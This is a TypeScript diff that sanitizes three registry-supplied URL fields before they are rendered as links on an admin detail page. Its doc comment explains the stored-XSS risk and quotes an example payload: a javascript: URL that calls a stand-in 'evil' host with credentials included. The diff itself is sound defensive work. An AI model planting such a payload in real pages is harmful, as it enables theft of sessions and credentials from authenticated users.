@@ -1,3 +1,4 @@
+import { sanitizeHttpUrl } from '@nessie/schemas'
 import type {
   AppCapabilities,
   AppCategory,
@@ -196,15 +197,27 @@ export type AppDetailContext = AppPresentationContext & {
   connections: AppConnectionSummaryRecord[]
 }
 
+/**
+ * `websiteUrl`, `documentationUrl` and `repositoryUrl` are rendered as `href`
+ * on the detail page, and their delivery vector is a registry record nobody
+ * wrote by hand: `javascript:fetch('https://evil',{credentials:'include'})` in
+ * `websiteUrl` is stored XSS in an authenticated admin origin. Ingestion
+ * refuses such a value on the way in (`registry/registry-mapper.ts`) and the
+ * wire schema constrains it; the same `sanitizeHttpUrl` refuses it on the way
+ * out, because rows already in the table predate both gates and the connector
+ * catalog surface writes the same three columns. An unparseable or relative
+ * value is dropped rather than repaired — a link this surface cannot vouch for
+ * is a link it does not offer.
+ */
 export const presentAppDetail = (
   row: StoreCatalogRow,
   context: AppDetailContext,
 ): AppDetailRecord => ({
   ...presentAppSummary(row, context),
   longDescription: row.longDescription,
-  websiteUrl: row.websiteUrl,
-  documentationUrl: row.documentationUrl,
-  repositoryUrl: row.repositoryUrl,
+  websiteUrl: sanitizeHttpUrl(row.websiteUrl),
+  documentationUrl: sanitizeHttpUrl(row.documentationUrl),
+  repositoryUrl: sanitizeHttpUrl(row.repositoryUrl),
   capabilities: context.capabilities,
   connections: context.connections,
   agentsWithAccess: context.agentsWithAccess,
